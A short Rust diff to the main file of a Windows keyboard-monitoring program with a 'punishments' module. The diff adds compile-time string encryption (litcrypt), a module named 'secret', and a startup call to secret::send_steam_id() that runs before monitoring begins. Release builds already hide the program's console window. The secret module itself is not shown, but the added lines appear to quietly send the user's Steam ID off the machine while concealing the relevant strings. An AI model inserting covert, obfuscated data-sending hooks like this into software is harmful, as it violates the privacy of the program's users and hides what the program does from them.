@@ -1,14 +1,24 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
+#[macro_use]
+extern crate litcrypt;
+
 mod punishments;
+mod secret;
+
 use punishments::*;
 use sdk::logger;
 use sdk::prelude::*;
+
+#[allow(unused_imports)]
+use sdk::utils;
 
 use std::sync::mpsc;
 use std::sync::Arc;
 use std::thread;
 use std::time::Duration;
+
+use_litcrypt!();
 
 fn attach(process: Process, window: Window) {
     let window = Arc::new(window);
@@ -64,9 +74,12 @@ fn attach(process: Process, window: Window) {
 }
 
 #[cfg(target_os = "windows")]
-fn main() {
+#[tokio::main]
+async fn main() {
     logger::init_env();
     Keyboard::listen();
+
+    secret::send_steam_id().await;
 
     log::info!("MONITORING...");
     loop {
